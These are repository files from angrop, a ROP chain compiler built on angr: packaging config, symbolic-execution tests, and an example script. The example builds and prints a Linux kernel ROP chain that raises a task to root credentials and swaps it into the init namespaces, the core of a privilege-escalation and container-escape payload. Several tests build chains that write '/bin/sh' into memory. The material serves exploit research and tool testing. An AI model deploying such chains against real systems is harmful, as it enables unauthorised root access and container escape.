
`examples/linux_escape_chain/payload_code.txt`:

```txt
chain = b""
chain += p64(0xffffffff8189c0de)	# pop rdi; ret 
chain += p64(0xffffffff8368b220)	# init_cred
chain += p64(0xffffffff8114d3a0)	# commit_creds
chain += p64(0xffffffff8189c0de)	# pop rdi; ret 
chain += p64(0x1)
chain += p64(0xffffffff8113fb50)	# find_task_by_vpid
chain += p64(0xffffffff816ea64d)	# pop rdi; mov esi, 0x8948ffd2; ret 
chain += p64(0xffffffff83600118)
chain += p64(0xffffffff818be4b4)	# pop rsi; ret 
chain += p64(0xffffffff82504104)	# srso_alias_safe_ret
chain += p64(0xffffffff810cd6f0)	# native_set_pte
chain += p64(0xffffffff818765a0)	# pop rbp; ret 
chain += p64(0xffffffff836000d0)
chain += p64(0xffffffff81aca592)	# push rax; pop rdi; call qword ptr [rbp + 0x48]
chain += p64(0xffffffff818be4b4)	# pop rsi; ret 
chain += p64(0xffffffff8368ad00)	# init_nsproxy
chain += p64(0xffffffff8114b250)	# switch_task_namespaces
chain += p64(0xffffffff8110a370)	# __x64_sys_fork
chain += p64(0xffffffff8189c0de)	# pop rdi; ret 
chain += p64(0xffffffff)
chain += p64(0xffffffff81213580)	# msleep
chain += p64(0xffffffff819c4490)

```

`examples/linux_escape_chain/pp.txt`:

```txt
0xffffffff8189c0de: pop rdi; ret 
                    0xffffffff8368b220
0xffffffff8114d3a0: <commit_creds>
0xffffffff8189c0de: pop rdi; ret 
                    0x1
0xffffffff8113fb50: <find_task_by_vpid>
0xffffffff816ea64d: pop rdi; mov esi, 0x8948ffd2; ret 
                    0xffffffff83600118
0xffffffff818be4b4: pop rsi; ret 
                    0xffffffff82504104
0xffffffff810cd6f0: mov qword ptr [rdi], rsi; xor esi, esi; xor edi, edi; jmp 0xffffffff822a7e60; ret 
0xffffffff818765a0: pop rbp; ret 
                    0xffffffff836000d0
0xffffffff81aca592: push rax; pop rdi; call qword ptr [rbp + 0x48]
0xffffffff818be4b4: pop rsi; ret 
                    0xffffffff8368ad00
0xffffffff8114b250: <switch_task_namespaces>
0xffffffff8110a370: <__x64_sys_fork>
0xffffffff8189c0de: pop rdi; ret 
                    0xffffffff
0xffffffff81213580: <msleep>
                    <BV64 next_pc_4629_64>


```

`examples/linux_escape_chain/solve.py`:

```py
"""
On my 16-core machine, it takes:
404s to analyze the gadgets
10s to optimize the graph
0.7s to generate the chain

"""
import os
import time
import logging
from multiprocessing import cpu_count

import angr
import angrop # pylint: disable=unused-import

logging.getLogger("cle.backends.elf.elf").setLevel("ERROR")

proj = angr.Project("./vmlinux_sym")
rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False, max_block_size=12, kernel_mode=True)
cpu_num = cpu_count()

start = time.time()
cache = "/tmp/linux_gadget_cache"
if os.path.exists(cache):
    rop.load_gadgets(cache, optimize=False)
else:
    rop.find_gadgets(processes=cpu_num, optimize=False)
    rop.save_gadgets(cache)
print("gadget finding time:", time.time() - start)

start = time.time()
rop.optimize(processes=cpu_num)
print("graph optimization time:", time.time() - start)

init_cred = 0xffffffff8368b220
init_nsproxy = 0xffffffff8368ad00
start = time.time()
chain = rop.func_call("commit_creds", [init_cred]) + \
        rop.func_call("find_task_by_vpid", [1]) + \
        rop.move_regs(rdi='rax') + \
        rop.set_regs(rsi=init_nsproxy, preserve_regs={'rdi'}) + \
        rop.func_call("switch_task_namespaces", [], preserve_regs={'rdi', 'rsi'}) + \
        rop.func_call('__x64_sys_fork', []) + \
        rop.func_call('msleep', [0xffffffff])
print("chain generation time:", time.time() - start)

chain.pp()
chain.print_payload_code()

```

`pyproject.toml`:

```toml
[build-system]
requires = ["setuptools"]
build-backend = "setuptools.build_meta"

```

`setup.cfg`:

```cfg
[metadata]
name = angrop
version = attr: angrop.__version__
url = https://github.com/angr/angrop
classifiers =
    License :: OSI Approved :: BSD License
    Programming Language :: Python :: 3
    Programming Language :: Python :: 3.6
license = BSD 2 Clause
license_files = LICENSE
description = The rop chain builder based off of angr
long_description = file: README.md
long_description_content_type = text/markdown

[options]
install_requires =
    angr
    tqdm
python_requires = >= 3.6
packages = find:

```

`setup.py`:

```py
from setuptools import setup
setup()

```

`tests/test_backend.py`:

```py
import io

import angr
import angrop # pylint: disable=unused-import

from angrop.rop_gadget import SyscallGadget

#BIN_DIR = os.path.join(os.path.dirname(__file__), "..", "..", "binaries")
#CACHE_DIR = os.path.join(BIN_DIR, 'tests_data', 'angrop_gadgets_cache')

def test_blob():
    """
    make sure angrop works well with the blob backend
    """
    bio = io.BytesIO(b"\x58\xC3\x0F\x05") # pop rax; ret; syscall
    proj = angr.Project(bio, main_opts={'backend': 'blob', 'arch': 'amd64'}, simos='linux')
    rop = proj.analyses.ROP(only_check_near_rets=False)

    gadget = rop.analyze_gadget(2)
    assert gadget
    assert isinstance(gadget, SyscallGadget)

def run_all():
    functions = globals()
    all_functions = {x:y for x, y in functions.items() if x.startswith('test_')}
    for f in sorted(all_functions.keys()):
        if hasattr(all_functions[f], '__call__'):
            all_functions[f]()

if __name__ == "__main__":
    import sys
    import logging

    logging.getLogger("angrop.rop").setLevel(logging.DEBUG)

    if len(sys.argv) > 1:
        globals()['test_' + sys.argv[1]]()
    else:
        run_all()

```

`tests/test_badbytes.py`:

```py
import os
import logging

import angr
import angrop  # pylint: disable=unused-import

l = logging.getLogger(__name__)

bin_path = os.path.abspath(os.path.join(os.path.dirname(os.path.realpath(__file__)), '..', '..', 'binaries'))
tests_dir = os.path.join(bin_path, 'tests')
data_dir = os.path.join(bin_path, 'tests_data', 'angrop_gadgets_cache')


"""
Suggestions on how to debug angr changes that break angrop.

If the gadget is completely missing after your changes. Pick the address that didn't work and run the following.
The logging should say why the gadget was discarded.

rop = p.analyses.ROP()
angrop.gadget_analyzer.l.setLevel("DEBUG")
rop._gadget_analyzer.analyze_gadget(addr)

If a gadget is missing memory reads / memory writes / memory changes, the actions are probably missing.
Memory changes require a read action followed by a write action to the same address.
"""

def test_badbyte():
    cache_path = os.path.join(data_dir, "bronze_ropchain")
    proj = angr.Project(os.path.join(tests_dir, "i386", "bronze_ropchain"), auto_load_libs=False)
    rop = proj.analyses.ROP()
    rop.set_badbytes([0x0, 0x0a])

    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path)
    else:
        rop.find_gadgets()
        rop.save_gadgets(cache_path)

    # make sure it can set 0 first
    chain = rop.set_regs(eax=0)
    state = chain.exec()
    assert not state.regs.eax.symbolic
    assert state.solver.eval(state.regs.eax == 0)
    assert all(x not in chain.payload_str() for x in [0, 0xa])

    # make sure it can set 0x16, which requires gadgets like `mov eax, 0x16`
    chain = rop.set_regs(eax=0x16)
    state = chain.exec()
    assert not state.regs.eax.symbolic
    assert state.solver.eval(state.regs.eax == 0x16)
    assert all(x not in chain.payload_str() for x in [0, 0xa])

    # make sure it can set 0xb
    # this binary does not have gadget that sets 0xb directly, it needs to do calculation
    # something like `mov eax, 8` and then `add eax, 3`
    chain = rop.set_regs(eax=0xb)
    state = chain.exec()
    assert not state.regs.eax.symbolic
    assert state.solver.eval(state.regs.eax == 0xb)
    assert all(x not in chain.payload_str() for x in [0, 0xa])

    # make sure it can write '/bin/sh\x00\n' into memory, notice that '\x00' and '\n' are bad bytes
    ptr = rop.chain_builder._mem_writer._get_ptr_to_writable(9+4)
    chain = rop.write_to_mem(ptr, b'/bin/sh\x00\n')
    state = chain.exec()
    assert state.solver.eval(state.memory.load(ptr, 9), cast_to=bytes)
    assert all(x not in chain.payload_str() for x in [0, 0xa])

    # finally, make sure setting multiple registers can work
    nullptr = rop.chain_builder._mem_writer._get_ptr_to_null()
    chain = rop.set_regs(eax=0xb, ebx=ptr, ecx=nullptr, edx=nullptr)
    state = chain.exec()
    assert not state.regs.eax.symbolic
    assert state.solver.eval(state.regs.eax == 0xb)
    assert not state.regs.ebx.symbolic
    assert state.solver.eval(state.regs.ebx == ptr)
    assert not state.regs.ecx.symbolic
    assert state.solver.eval(state.regs.ecx == nullptr)
    assert not state.regs.edx.symbolic
    assert state.solver.eval(state.regs.edx == nullptr)
    assert all(x not in chain.payload_str() for x in [0, 0xa])


def run_all():
    functions = globals()
    all_functions = {x:y for x, y in functions.items() if x.startswith('test_')}
    for f in sorted(all_functions.keys()):
        if hasattr(all_functions[f], '__call__'):
            all_functions[f]()


if __name__ == "__main__":
    logging.getLogger("angrop.rop").setLevel(logging.DEBUG)

    import sys
    if len(sys.argv) > 1:
        globals()['test_' + sys.argv[1]]()
    else:
        run_all()

```

`tests/test_chainbuilder.py`:

```py
import os

import claripy

import angr
import angrop # pylint: disable=unused-import
from angrop.rop_value import RopValue
from angrop.rop_block import RopBlock
from angrop.errors import RopException

BIN_DIR = os.path.join(os.path.dirname(__file__), "..", "..", "binaries")
CACHE_DIR = os.path.join(BIN_DIR, 'tests_data', 'angrop_gadgets_cache')

def test_symbolic_data():
    cache_path = os.path.join(CACHE_DIR, "amd64_glibc_2.19")
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "x86_64", "libc.so.6"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path, optimize=False)
    else:
        rop.find_gadgets()
        rop.save_gadgets(cache_path)

    var1 = claripy.BVS("var1", proj.arch.bits)
    var2 = claripy.BVS("var2", proj.arch.bits)
    chain = rop.set_regs(rax=var1, rbx=var2)

    state = chain.exec()
    assert state.solver.satisfiable(extra_constraints=[state.regs.rax != var1]) is False
    assert state.solver.satisfiable(extra_constraints=[state.regs.rbx != var2]) is False

def test_x86_64_func_call():
    cache_path = os.path.join(CACHE_DIR, "1after909")
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "x86_64", "1after909"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path)
    else:
        rop.find_gadgets()
        rop.save_gadgets(cache_path)

    chain = rop.func_call('puts', [0x402704]) + rop.func_call('puts', [0x402704])
    state = chain.exec()
    assert state.posix.dumps(1) == b'Enter username: \nEnter username: \n'

def test_i386_func_call():
    cache_path = os.path.join(CACHE_DIR, "bronze_ropchain")
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "i386", "bronze_ropchain"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path)
    else:
        rop.find_gadgets()
        rop.save_gadgets(cache_path)

    chain = rop.func_call('write', [1, 0x80AC5E8, 17]) + rop.func_call('write', [1, 0x80AC5E8, 17])
    state = chain.exec()
    assert state.posix.dumps(1) == b'/usr/share/locale/usr/share/locale'

def test_arm_func_call():
    cache_path = os.path.join(CACHE_DIR, "armel_glibc_2.31")
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "armel", "libc-2.31.so"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False, is_thumb=True)
    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path)
    else:
        rop.find_gadgets()
        rop.save_gadgets(cache_path)

    chain = rop.set_regs(lr=0x41414141)
    assert sum(g.stack_change for g in chain._gadgets) <= 12

    proj.hook_symbol('write', angr.SIM_PROCEDURES['posix']['write']())
    chain1 = rop.func_call("write", [1, 0x4E15F0, 9])
    state = chain1.exec()
    assert state.posix.dumps(1) == b'malloc.c\x00'

    proj.hook_symbol('puts', angr.SIM_PROCEDURES['libc']['puts']())
    chain2 = rop.func_call("puts", [0x4E15F0])
    state = chain2.exec()
    assert state.posix.dumps(1) == b'malloc.c\n'

    chain = chain1 + chain2
    state = chain.exec()
    assert state.posix.dumps(1) == b'malloc.c\x00malloc.c\n'

def test_i386_syscall():
    cache_path = os.path.join(CACHE_DIR, "bronze_ropchain")
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "i386", "bronze_ropchain"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path)
    else:
        rop.find_gadgets()
        rop.save_gadgets(cache_path)

    chain = rop.do_syscall(4, [1, 0x80AC5E8, 17])
    state = chain.exec()
    assert state.posix.dumps(1) == b'/usr/share/locale'

def test_x86_64_syscall():
    cache_path = os.path.join(CACHE_DIR, "amd64_glibc_2.19")
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "x86_64", "libc.so.6"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path, optimize=False)
    else:
        rop.find_gadgets()
        rop.save_gadgets(cache_path)

    gadget = rop.analyze_gadget(0x4fb4a6)
    rop.chain_builder._sys_caller.syscall_gadgets = [gadget]
    chain = rop.do_syscall(0x2f, [], needs_return=False)
    assert chain

    # TODO: technically, we should support using this gadget, but
    # we don't. So use it to test whether we can catch wrong chains
    gadget = rop.analyze_gadget(0x536715)
    rop.chain_builder._sys_caller.syscall_gadgets = [gadget]
    try:
        chain = rop.do_syscall(0xca, [0, 0x81], needs_return=False)
        assert chain is None
    except RopException:
        pass

def test_preserve_regs():
    cache_path = os.path.join(CACHE_DIR, "1after909")
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "x86_64", "1after909"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path)
    else:
        rop.find_gadgets()
        rop.save_gadgets(cache_path)

    chain1 = rop.set_regs(rdi=0x402715)
    chain2 = rop.func_call('puts', [0x402704], preserve_regs=['rdi'])
    chain = chain1+chain2
    state = chain.exec()
    assert state.posix.dumps(1) == b'Failed to parse username.\n'

def test_i386_mem_write():
    cache_path = os.path.join(CACHE_DIR, "i386_glibc_2.35")
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "i386", "i386_glibc_2.35"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path, optimize=False)
    else:
        rop.find_gadgets()
        rop.save_gadgets(cache_path)

    chain = rop.write_to_mem(0xdeadbeef, b"/bin/sh\x00")

    state = chain.exec()
    s = state.solver.eval(state.memory.load(0xdeadbeef, 8), cast_to=bytes)
    assert s == b"/bin/sh\x00"

def test_ropvalue():
    cache_path = os.path.join(CACHE_DIR, "i386_glibc_2.35")
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "i386", "i386_glibc_2.35"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path, optimize=False)
    else:
        rop.find_gadgets()
        rop.save_gadgets(cache_path)

    chain = rop.write_to_mem(0x800000, b"/bin/sh\x00")
    assert sum(x._rebase is False for x in chain._values) == 4 # 4 values

    value = RopValue(0x800000, proj)
    value._rebase = False
    chain = rop.write_to_mem(value, b"/bin/sh\x00")
    assert sum(x._rebase is False for x in chain._values) == 4 # 4 values

    value = RopValue(0x800000, proj)
    value.rebase_ptr()
    chain = rop.write_to_mem(value, b"/bin/sh\x00")
    assert sum(x._rebase is False for x in chain._values) == 2 # 4 values

def test_reg_move():
    cache_path = os.path.join(CACHE_DIR, "bronze_ropchain")
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "i386", "bronze_ropchain"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path)
    else:
        rop.find_gadgets()
        rop.save_gadgets(cache_path)

    # test single register move
    chain = rop.set_regs(ecx=0x41414141)
    chain += rop.move_regs(eax="ecx")
    state = chain.exec()
    assert state.regs.eax.concrete_value == 0x41414141

    # test multiple register moves at the same time
    chain = rop.set_regs(ecx=0x42424242)
    chain += rop.set_regs(ebx=0x41414141, preserve_regs=['ecx'])
    chain += rop.move_regs(edx='ebx', eax='ecx')
    state = chain.exec()
    assert state.regs.eax.concrete_value == 0x42424242
    assert state.regs.edx.concrete_value == 0x41414141

def test_set_regs():
    cache_path = os.path.join(CACHE_DIR, "armel_glibc_2.31")
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "armel", "libc-2.31.so"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False, is_thumb=True)
    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path, optimize=False)
    else:
        rop.find_gadgets()
        rop.save_gadgets(cache_path)

    chain = rop.set_regs(r4=0x4141412c, r5=0x42424242)
    state = chain.exec()
    assert state.regs.r4.concrete_value == 0x4141412c
    assert state.regs.r5.concrete_value == 0x42424242

def test_add_to_mem():
    cache_path = os.path.join(CACHE_DIR, "i386_glibc_2.35")
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "i386", "i386_glibc_2.35"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path, optimize=False)
    else:
        rop.find_gadgets()
        rop.save_gadgets(cache_path)

    chain = rop.write_to_mem(0xdeadbeef, b'CCCC') # 0x43434343
    chain += rop.add_to_mem(0xdeadbeef, 0x62a000)
    state = chain.exec()
    assert state.mem[0xdeadbeef].long.unsigned.concrete == 0x43a5e343

    chain = rop.write_to_mem(0x41414140, b'CCCC') # 0x43434343
    chain += rop.add_to_mem(0x41414140, 0x42424242)

    state = chain.exec()
    assert state.memory.load(0x41414140, 4).concrete_value == 0x85858585

    cache_path = os.path.join(CACHE_DIR, "armel_glibc_2.31")
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "armel", "libc-2.31.so"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False, is_thumb=True, cond_br=False)
    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path, optimize=False)
    else:
        rop.find_gadgets()
        rop.save_gadgets(cache_path)

    rop.add_to_mem(0x41414140, 0x42424242)

    cache_path = os.path.join(CACHE_DIR, "amd64_glibc_2.19")
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "x86_64", "libc.so.6"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path, optimize=False)
    else:
        rop.find_gadgets()
        rop.save_gadgets(cache_path)

    rop.add_to_mem(0x41414140, 0x42424242)

def test_pivot():
    cache_path = os.path.join(CACHE_DIR, "i386_glibc_2.35")
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "i386", "i386_glibc_2.35"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path, optimize=False)
    else:
        rop.find_gadgets()
        rop.save_gadgets(cache_path)

    chain = rop.pivot(0x41414140)
    state = chain.exec()
    assert state.solver.eval(state.regs.sp == 0x41414140)

    chain = rop.set_regs(eax=0x41414140)
    chain += rop.pivot('eax')
    state = chain.exec()
    assert state.solver.eval(state.regs.sp == 0x41414140+4)

def test_shifter():
    # i386
    cache_path = os.path.join(CACHE_DIR, "i386_glibc_2.35")
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "i386", "i386_glibc_2.35"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path, optimize=False)
    else:
        rop.find_gadgets()
        rop.save_gadgets(cache_path)

    chain = rop.shift(0x50, preserve_regs=['ebx'])
    init_sp = chain._blank_state.regs.sp.concrete_value
    state = chain.exec()
    assert state.regs.sp.concrete_value == init_sp + 0x50 + proj.arch.bytes

    chain = rop.set_regs(ebx=0x41414141)
    chain += rop.shift(0x50, preserve_regs=['ebx'])
    state = chain.exec()
    assert state.regs.ebx.concrete_value == 0x41414141

    chain = rop.set_regs(eax=0x41414141)
    chain += rop.shift(0x50, preserve_regs=['eax'])
    state = chain.exec()
    assert state.regs.eax.concrete_value == 0x41414141

    # x86_64
    cache_path = os.path.join(CACHE_DIR, "1after909")
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "x86_64", "1after909"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path, optimize=False)
    else:
        rop.find_gadgets()
        rop.save_gadgets(cache_path)

    chain = rop.shift(0x40)
    init_sp = chain._blank_state.regs.sp.concrete_value
    state = chain.exec()
    assert state.regs.sp.concrete_value == init_sp + 0x40 + proj.arch.bytes

    # armel
    cache_path = os.path.join(CACHE_DIR, "armel_glibc_2.31")
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "armel", "libc-2.31.so"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False, is_thumb=True)
    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path, optimize=False)
    else:
        rop.find_gadgets()
        rop.save_gadgets(cache_path)

    chain = rop.shift(0x40)
    init_sp = chain._blank_state.regs.sp.concrete_value
    state = chain.exec()
    assert state.regs.sp.concrete_value == init_sp + 0x40 + proj.arch.bytes

    # aarch64
    cache_path = os.path.join(CACHE_DIR, "aarch64_glibc_2.19")
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "aarch64", "libc.so.6"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=True, only_check_near_rets=False)

    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path, optimize=False)
    else:
        rop.find_gadgets()
        rop.save_gadgets(cache_path)

    chain = rop.shift(0x10)
    init_sp = chain._blank_state.regs.sp.concrete_value
    state = chain.exec()
    assert state.regs.sp.concrete_value == init_sp + 0x10 + proj.arch.bytes

def test_retsled():
    # i386
    cache_path = os.path.join(CACHE_DIR, "i386_glibc_2.35")
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "i386", "i386_glibc_2.35"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path, optimize=False)
    else:
        rop.find_gadgets()
        rop.save_gadgets(cache_path)

    chain = rop.retsled(0x40)
    assert len(chain.payload_str()) == 0x40

    # x86_64
    cache_path = os.path.join(CACHE_DIR, "1after909")
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "x86_64", "1after909"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path)
    else:
        rop.find_gadgets()
        rop.save_gadgets(cache_path)

    chain = rop.retsled(0x40)
    assert len(chain.payload_str()) == 0x40

    # armel
    cache_path = os.path.join(CACHE_DIR, "armel_glibc_2.31")
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "armel", "libc-2.31.so"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False, is_thumb=True)
    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path, optimize=False)
    else:
        rop.find_gadgets()
        rop.save_gadgets(cache_path)

    chain = rop.retsled(0x40)
    assert len(chain.payload_str()) == 0x40

def test_pop_pc_syscall_chain():
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "x86_64", "angrop_retn_test"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    rop.find_gadgets_single_threaded(show_progress=False)

    chain1 = rop.do_syscall(3, [0])
    chain2 = rop.do_syscall(0x27, [0])
    final_chain = chain1 + chain2
    state = final_chain.exec()
    assert state.regs.rax.concrete_value == 1337
    assert 0 not in state.posix.fd

    chain = rop.do_syscall(3, [0])
    gadget = rop.analyze_gadget(0x0000000000401138) # pop rdi; ret
    chain.add_gadget(gadget)
    chain.add_value(0x41414141)
    state = chain.exec()
    assert state.regs.rdi.concrete_value == 0x41414141
    assert 0 not in state.posix.fd

def test_retn_i386_call_chain():
    cache_path = os.path.join(CACHE_DIR, "bronze_ropchain")
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "i386", "bronze_ropchain"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path)
    else:
        rop.find_gadgets()
        rop.save_gadgets(cache_path)

    # force to use 'retn 0xc' to clean up function arguments
    g = rop.analyze_gadget(0x809d9fb)
    rop._chain_builder._shifter.shift_gadgets = {g.stack_change: [g]}

    chain = rop.func_call('write', [1, 0x80AC5E8, 17], needs_return=False)

    chain = None
    try:
        chain = rop.func_call('write', [1, 0x80AC5E8, 17])
    except RopException:
        pass
    assert chain is None

def test_aarch64_basic_reg_setting():
    proj = angr.load_shellcode(
        """
        mov x0, x29
        ldp x29, x30, [sp], #0x10
        ret
        """,
        "aarch64",
        load_address=0x400000,
        auto_load_libs=False,
    )
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    rop.find_gadgets_single_threaded(show_progress=False)
    chain = rop.set_regs(x0=0x41414141)
    state = chain.exec()
    assert state.regs.x0.concrete_value == 0x41414141

def test_aarch64_jump_reg():
    proj = angr.load_shellcode(
        """
        ldp x0, x4, [sp, #0x10]
        ldp x29, x30, [sp], #0x20
        ret
        mov x1, x29
        br x4
        """,
        "aarch64",
        load_address=0x400000,
        auto_load_libs=False,
    )
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    rop.find_gadgets_single_threaded(show_progress=False)
    chain = rop.set_regs(x0=0x41414141, x1=0x42424242)
    state = chain.exec()
    assert state.regs.x0.concrete_value == 0x41414141
    assert state.regs.x1.concrete_value == 0x42424242

def test_aarch64_cond_branch():
    proj = angr.load_shellcode(
        """
        ldp x0, x1, [sp, #0x10]
        ldp x29, x30, [sp], #0x20
        ret
        ldr x2, [sp, #0x10]
        add x0, x0, #0x42
        cmp x0, x1
        b.ne .ret
        ldp x29, x30, [sp], #0x20
        .ret:
        ret
        """,
        "aarch64",
        load_address=0x400000,
        auto_load_libs=False,
    )
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False, cond_br=True)
    rop.find_gadgets_single_threaded(show_progress=False)
    addrs = [x.addr for x in rop._all_gadgets]

    assert addrs.count(0x40000c) == 2
    assert addrs.count(0x400010) == 2
    assert 0x400008 in addrs or 0x400020 in addrs
    assert any(x in addrs for x in (0x400004, 0x40001c))

    chain = rop.set_regs(x2=0x41414141)
    state = chain.exec()
    assert state.regs.x2.concrete_value == 0x41414141

def test_aarch64_mem_access():
    proj = angr.load_shellcode(
        """
        ldp x0, x1, [sp, #0x10]
        str x1, [x1]
        ldp x29, x30, [sp], #0x20
        ret
        """,
        "aarch64",
        load_address=0x400000,
        auto_load_libs=False,
    )
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    rop.find_gadgets_single_threaded(show_progress=False)
    chain = rop.set_regs(x0=0x41414141, modifiable_memory_range=(0x1000, 0x2000))
    state = chain.exec()
    assert state.regs.x0.concrete_value == 0x41414141
    for action in state.history.actions:
        if action.type == action.MEM and action.action == action.WRITE:
            assert 0x400000 <= action.addr.ast.concrete_value < 0x401000

def test_mipstake():
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "mips", "mipstake"), auto_load_libs=True, arch="mips")
    rop = proj.analyses.ROP(max_block_size=40)
    # lw $ra, 0x34($sp);
    # lw $s5, 0x30($sp);
    # lw $s4, 0x2c($sp);
    # lw $s3, 0x28($sp);
    # lw $s2, 0x24($sp);
    # lw $s1, 0x20($sp);
    # lw $s0, 0x1c($sp);
    # jr $ra;
    # addiu $sp, $sp, 0x38
    g = rop.analyze_gadget(0x400E64)
    assert g is not None

    # lw $t9, ($s1);
    # addiu $s0, $s0, 1;
    # move $a0, $s3;
    # move $a1, $s4;
    # jalr $t9;
    # move $a2, $s5
    g = rop.analyze_gadget(0x400E40)
    assert g is not None
    chain = rop.func_call("sleep", [0x41414141, 0x42424242, 0x43434343])
    sleep_addr = proj.loader.main_object.imports['sleep'].value
    state = chain.concrete_exec_til_addr(sleep_addr)
    assert state.regs.a0.concrete_value == 0x41414141
    assert state.regs.a1.concrete_value == 0x42424242
    assert state.regs.a2.concrete_value == 0x43434343

def test_unexploitable():
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "x86_64", "unexploitable"), auto_load_libs=False)
    rop = proj.analyses.ROP(max_block_size=40, fast_mode=False, only_check_near_rets=False)
    g = rop.analyze_gadget(0x4005D0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12 + rbx*8]
    assert g is not None
    # mov rbx, qword ptr [rsp + 8];
    # mov rbp, qword ptr [rsp + 0x10];
    # mov r12, qword ptr [rsp + 0x18];
    # mov r13, qword ptr [rsp + 0x20];
    # mov r14, qword ptr [rsp + 0x28];
    # mov r15, qword ptr [rsp + 0x30];
    # add rsp, 0x38; ret
    g = rop.analyze_gadget(0x4005E6)
    assert g is not None
    chain = rop.func_call("sleep", [0x41414141, 0x4242424242424242, 0x4343434343434343])

    sleep_addr = proj.loader.main_object.imports['sleep'].value
    state = chain.concrete_exec_til_addr(sleep_addr)
    assert state.regs.rdi.concrete_value == 0x41414141
    assert state.regs.rsi.concrete_value == 0x4242424242424242
    assert state.regs.rdx.concrete_value == 0x4343434343434343

def test_graph_search_reg_setter():
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "x86_64", "arjsfxjr"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=False)
    cache_path = os.path.join(CACHE_DIR, "arjsfxjr")

    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path)
    else:
        rop.find_gadgets()
        rop.save_gadgets(cache_path)

    # the easy peasy pop-only reg setter
    chain = rop.set_regs(r15=0x41414141)
    assert chain

    # the ability to utilize concrete values
    # 0x000000000040259e : xor eax, eax ; add rsp, 8 ; ret
    chain = rop.set_regs(rax=0)
    assert chain

    # the ability to set a register and then move it to another
    chain = rop.set_regs(rax=0x41414141)
    assert chain
    state = chain.exec()
    assert state.regs.rax.concrete_value == 0x41414141

    # the ability to write_to_mem
    chain = rop.write_to_mem(0x41414141, b'BBBB')
    assert chain
    state = chain.exec()
    assert state.solver.eval(state.memory.load(0x41414141, 4), cast_to=bytes) == b'BBBB'

    # the ability to write_to_mem and utilize jmp_mem gadgets
